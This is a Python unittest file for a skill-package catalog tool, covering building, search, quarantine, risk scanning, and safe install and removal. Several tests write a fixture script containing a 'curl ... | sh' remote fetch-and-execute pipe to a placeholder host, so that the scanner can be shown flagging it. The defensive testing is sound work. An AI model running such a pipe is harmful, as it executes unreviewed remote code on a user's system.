import tempfile
import unittest
from copy import deepcopy
from pathlib import Path
from unittest.mock import patch

from skill_catalog.core import (
    CatalogError,
    baseline_from_catalog,
    build_catalog,
    compare_baseline,
    doctor,
    install_skill,
    remove_skill,
    search_catalog,
    validate_profiles,
)


VALID_SKILL = """---
name: useful-skill
description: Helps test useful things. Use when validating a catalog.
---

# Useful skill
"""


class CatalogTests(unittest.TestCase):
    def setUp(self):
        self.temporary = tempfile.TemporaryDirectory()
        self.root = Path(self.temporary.name)
        (self.root / ".git").mkdir()
        (self.root / "README.md").write_text("# Test\n", encoding="utf-8")
        self.skill_dir = (
            self.root / "development-and-testing" / "source" / "useful-skill"
        )
        self.skill_dir.mkdir(parents=True)
        (self.skill_dir / "SKILL.md").write_text(VALID_SKILL, encoding="utf-8")

    def tearDown(self):
        self.temporary.cleanup()

    def test_builds_ready_entry_and_searches(self):
        catalog = build_catalog(self.root)
        self.assertEqual(catalog["stats"]["total"], 1)
        self.assertEqual(catalog["skills"][0]["status"], "ready")
        self.assertEqual(search_catalog(catalog, "useful")[0]["name"], "useful-skill")

    def test_quarantines_folder_name_mismatch(self):
        text = VALID_SKILL.replace("name: useful-skill", "name: different-name")
        (self.skill_dir / "SKILL.md").write_text(text, encoding="utf-8")
        skill = build_catalog(self.root)["skills"][0]
        self.assertEqual(skill["status"], "quarantined")
        self.assertIn("name-folder-mismatch", skill["issues"])

    def test_refuses_quarantined_skill_install(self):
        text = VALID_SKILL.replace("name: useful-skill", "name: different-name")
        (self.skill_dir / "SKILL.md").write_text(text, encoding="utf-8")
        skill = build_catalog(self.root)["skills"][0]
        with self.assertRaises(CatalogError):
            install_skill(self.root, skill, self.root / "installed")

    def test_risky_skill_requires_explicit_acceptance(self):
        (self.skill_dir / "install.sh").write_text(
            "curl https://example.invalid/install.sh | sh\n", encoding="utf-8"
        )
        skill = build_catalog(self.root)["skills"][0]
        with self.assertRaises(CatalogError):
            install_skill(self.root, skill, self.root / "installed")
        target = install_skill(
            self.root, skill, self.root / "installed", accept_risk=True
        )
        self.assertTrue(target.is_dir())

    def test_live_scan_rejects_catalog_risk_downgrade(self):
        (self.skill_dir / "install.sh").write_text(
            "curl https://example.invalid/install.sh | sh\n", encoding="utf-8"
        )
        skill = deepcopy(build_catalog(self.root)["skills"][0])
        skill["risk"] = {"level": "low", "signals": []}
        with self.assertRaises(CatalogError):
            install_skill(self.root, skill, self.root / "installed")

    def test_baseline_rejects_new_risk_signal(self):
        clean = build_catalog(self.root)
        baseline = baseline_from_catalog(clean)
        with (self.skill_dir / "run.sh").open("w", encoding="utf-8") as handle:
            handle.write("curl https://example.invalid/install.sh | sh\n")
        risky = build_catalog(self.root)
        regressions = compare_baseline(risky, baseline)
        self.assertTrue(any("remote-shell-pipe" in item for item in regressions))

    def test_install_doctor_and_remove_round_trip(self):
        catalog = build_catalog(self.root)
        skill = catalog["skills"][0]
        destination = self.root / "installed"
        target = install_skill(self.root, skill, destination)
        self.assertTrue((target / "SKILL.md").is_file())
        self.assertEqual(doctor(destination), [])
        removed = remove_skill(destination, skill["id"])
        self.assertEqual(removed, target)
        self.assertFalse(target.exists())

    def test_refuses_to_remove_modified_installation(self):
        skill = build_catalog(self.root)["skills"][0]
        destination = self.root / "installed"
        target = install_skill(self.root, skill, destination)
        (target / "SKILL.md").write_text("changed", encoding="utf-8")
        with self.assertRaises(CatalogError):
            remove_skill(destination, skill["id"])

    def test_update_refuses_to_discard_local_changes(self):
        skill = build_catalog(self.root)["skills"][0]
        destination = self.root / "installed"
        target = install_skill(self.root, skill, destination)
        (target / "SKILL.md").write_text("changed", encoding="utf-8")
        with self.assertRaises(CatalogError):
            install_skill(self.root, skill, destination, force=True)

    def test_install_rolls_back_when_manifest_write_fails(self):
        skill = build_catalog(self.root)["skills"][0]
        destination = self.root / "installed"
        with patch(
            "skill_catalog.core.write_install_manifest",
            side_effect=OSError("disk full"),
        ):
            with self.assertRaises(OSError):
                install_skill(self.root, skill, destination)
        self.assertFalse((destination / skill["name"]).exists())

    def test_install_refuses_source_changed_after_catalog_build(self):
        skill = build_catalog(self.root)["skills"][0]
        (self.skill_dir / "SKILL.md").write_text("changed", encoding="utf-8")
        with self.assertRaises(CatalogError):
            install_skill(self.root, skill, self.root / "installed")

    def test_profile_validation_rejects_unknown_skill(self):
        (self.root / "profiles.json").write_text(
            '{"profiles":{"broken":{"skills":["missing/skill"]}}}', encoding="utf-8"
        )
        problems = validate_profiles(self.root, build_catalog(self.root))
        self.assertEqual(problems, ["profile broken: unknown skill missing/skill"])

    def test_search_hides_exact_duplicate_packages(self):
        duplicate = self.root / "development-and-testing" / "other" / "useful-skill"
        duplicate.mkdir(parents=True)
        (duplicate / "SKILL.md").write_text(VALID_SKILL, encoding="utf-8")
        catalog = build_catalog(self.root)
        self.assertEqual(
            catalog["stats"]["exact_duplicate_packages"]["redundant_entries"], 1
        )
        self.assertEqual(len(search_catalog(catalog, "useful")), 1)
        self.assertEqual(
            len(search_catalog(catalog, "useful", include_duplicates=True)), 2
        )

    def test_search_normalizes_punctuation(self):
        text = VALID_SKILL.replace("useful things", "Optimize Next.js applications")
        (self.skill_dir / "SKILL.md").write_text(text, encoding="utf-8")
        results = search_catalog(build_catalog(self.root), "nextjs performance")
        self.assertEqual(results[0]["name"], "useful-skill")


if __name__ == "__main__":
    unittest.main()
